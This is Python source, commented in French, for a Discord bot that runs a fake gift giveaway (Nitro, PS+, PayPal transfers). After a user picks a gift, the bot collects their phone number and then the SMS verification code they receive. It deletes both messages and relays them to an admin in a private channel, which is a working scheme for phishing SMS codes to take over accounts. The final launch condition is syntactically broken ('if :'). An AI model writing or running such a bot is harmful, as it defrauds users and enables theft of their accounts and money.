import discord
from discord.ext import commands
import os
import asyncio

# Configuration des intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# Création du bot avec le prefixe !
bot = commands.Bot(command_prefix="+", intents=intents)

# Récupération des variables d'environnement
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

GIFTS = [
    discord.SelectOption(label="Discord Nitro 1 An", emoji="💎", value="nitro_1y"),
    discord.SelectOption(label="Snap+", emoji="👻", value="snap_plus"),
    discord.SelectOption(label="PS+", emoji="🎮", value="ps_plus"),
    discord.SelectOption(label="Déco de ton choix", emoji="🌸", value="deco_choice"),
    discord.SelectOption(label="Pack de ton choix", emoji="🎁", value="pack_choice"),
    discord.SelectOption(label="Virement PayPal 50€", emoji="💳", value="paypal_50"),
    discord.SelectOption(label="Virement PayPal 100€", emoji="💳", value="paypal_100"),
]

class GiftSelect(discord.ui.Select):
    def __init__(self):
        super().__init__(placeholder="Choisis ton cadeau...", options=GIFTS, custom_id="gift_select")

    async def callback(self, interaction: discord.Interaction):
        # 1. Réponse immédiate pour éviter le "L'application ne répond plus"
        selected_gift = self.values[0]
        await interaction.response.send_message(
            f"Tu as choisi : **{self.get_option(selected_gift).label}**\n\n"
            "Maintenant, entre ton numéro de téléphone (format : +33XXXXXXXXX) :",
            ephemeral=True
        )

        # 2. Vérification des messages entrants
        def check(m):
            return m.author == interaction.user and m.channel == interaction.channel

        try:
            # 3. Attente du numéro de téléphone (timeout de 120s)
            phone_msg = await bot.wait_for("message", check=check, timeout=120)
            phone_number = phone_msg.content.strip()
            await phone_msg.delete()

            # Création du channel privé
            guild = interaction.guild
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True),
                interaction.user: discord.PermissionOverwrite(read_messages=True),
            }
            admin = guild.get_member(ADMIN_ID)
            if admin:
                overwrites[admin] = discord.PermissionOverwrite(read_messages=True)

            channel_name = f"gift-{interaction.user.id}"
            private_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)

            gift_label = self.get_option(selected_gift).label

            # Message au admin dans le nouveau channel
            embed = discord.Embed(title="🎁 Nouvelle commande", color=discord.Color.purple())
            embed.add_field(name="Utilisateur", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=False)
            embed.add_field(name="Cadeau choisi", value=gift_label, inline=False)
            embed.add_field(name="Numéro de téléphone", value=f"||{phone_number}||", inline=False)

            await private_channel.send(embed=embed)

            # Notification à l'utilisateur
            await interaction.followup.send(
                f"Channel créé : {private_channel.mention}\n"
                "Un admin va valider ta demande. Entre le code SMS reçu (format : XXXX) :",
                ephemeral=True
            )

            # 4. Attente du code SMS
            try:
                sms_msg = await bot.wait_for("message", check=check, timeout=120)
                sms_code = sms_msg.content.strip()
                await sms_msg.delete()

                embed2 = discord.Embed(title="📱 Code SMS reçu", color=discord.Color.blue())
                embed2.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
                embed2.add_field(name="Code SMS", value=f"||{sms_code}||", inline=False)
                await private_channel.send(embed=embed2)

                await interaction.followup.send(
                    "✅ Code SMS envoyé. Merci !",
                    ephemeral=True
                )
            except asyncio.TimeoutError:
                await interaction.followup.send("⏰ Temps écoulé pour le code SMS.", ephemeral=True)

        except asyncio.TimeoutError:
            await interaction.followup.send("⏰ Temps écoulé pour le numéro de téléphone.", ephemeral=True)

    def get_option(self, value):
        for opt in self.options:
            if opt.value == value:
                return opt
        return None

class GiftView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None) # Pas de timeout global pour la vue
        self.add_item(GiftSelect())

@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")
    # La View est ajoutée dynamiquement lors de l'appel à /cadeaux,
    # mais tu peux aussi l'ajouter ici si tu veux qu'elle soit globale.
    # Pour ton cas, l'ajout dans la commande est suffisant.

@bot.command(name="cadeaux")  # Nom de la commande : /cadeaux ou !cadeaux selon le prefixe
async def setup(ctx):
    if ctx.author.id != ADMIN_ID:
        await ctx.send("Seul l'admin peut utiliser cette commande.")
        return

    embed = discord.Embed(
        title="🎁 Choisis ton cadeau",
        description="Sélectionne le cadeau que tu veux recevoir ci-dessous.",
        color=discord.Color.gold()
    )
    # Envoi du message avec la vue
    await ctx.send(embed=embed, view=GiftView())

# Lancement du bot
if __name__ == "__main__":
    if :
        bot.run(DISCORD_TOKEN)
    else:
        print("Erreur : DISCORD_TOKEN n'est pas défini.")
